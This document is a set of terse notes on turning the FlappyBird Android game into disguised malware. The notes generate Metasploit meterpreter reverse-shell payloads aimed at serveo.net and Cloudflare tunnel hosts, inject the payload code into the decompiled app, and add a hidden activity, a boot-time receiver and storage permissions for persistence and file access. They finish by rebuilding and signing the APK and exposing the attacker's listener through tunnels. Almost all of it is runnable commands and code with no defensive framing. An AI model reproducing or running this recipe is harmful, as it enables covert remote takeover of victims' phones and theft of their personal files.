Tools

Metasploit & serveo.net
APKTool or JADX
Frida
MobSF


	Step 1: Decompile the FlappyBird APK
apktool d FlappyBird_1.3_APKPure.apk -o FlappyBirdSource
java -jar /usr/local/bin/apktool.jar d FlappyBird.apk -o FlappyBirdDecoded
java -jar /usr/local/bin/apktool.jar d FlappyBird.apk --no-res -o FlappyBirdDecoded

	Step 2: Generate the Malware Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 R -o payload.apk
msfvenom -p android/meterpreter/reverse_https LHOST=podcasts-enlarge-ron-image.trycloudflare.com LPORT=4444 R -o payload.apk

msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.serveo.net LPORT=4445 -o payload.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.serveo.net LPORT=4445 --platform android --arch dalvik -o persistent.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.serveo.net LPORT=4445 --arch arm64 -o payload.apk
	
	Existing App Like FlappyBird.apk
msfvenom -x FlappyBird.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.serveo.net LPORT=4445 --platform android --arch dalvik -o infectedFlappyBird.apk


	Step 3: Decompile the Payload APK
apktool d payload.apk -o PayloadSource

	Step 4: Inject the Payload into Flappy Bird
cp -r PayloadSource/smali/* FlappyBirdSource/smali/

	Step 5: Modify the Main Activity
Find the main activity file, usually named something like MainActivity.smali or com/flappybird/MainActivity.smali.
Open it in a text editor and find the onCreate method.
Add this line at the beginning of the onCreate method:

invoke-static {}, Lcom/metasploit/stage/MainActivity;->start(Landroid/content/Context;)V

	Step 6: Adding Required Permissions in A for Gallery Access
Open the AndroidManifest.xml file in the FlappyBirdSource directory and paste:

<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

Add this Metasploit Activity in under <Application Tag>

<activity android:name="com.metasploit.stage.MainActivity" 
          android:theme="@android:style/Theme.NoDisplay">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
    </intent-filter>
</activity>
<receiver android:name="com.metasploit.stage.MainBroadcastReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver>
<service android:name="com.metasploit.stage.MainService"/>
        
	
	Step 7: Rebuild and Sign the APK
apktool b FlappyBirdSource -o FlappyBird_Hacked_Permissions.apk
	
	Step 8: Generate a keystore if you donâ€™t have one:
keytool -genkey -v -keystore my-release-key.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore FlappyBird_Hacked_Permissions.apk mykey

use serveo.net for creating server before msfconsole	
ssh -R 4445:localhost:4445 serveo.net
	
	Making LHOST by Cloudflare Tunnel 
sudo netstat -tulnp | grep 4444 
cloudflared tunnel --url tcp://localhost:4444
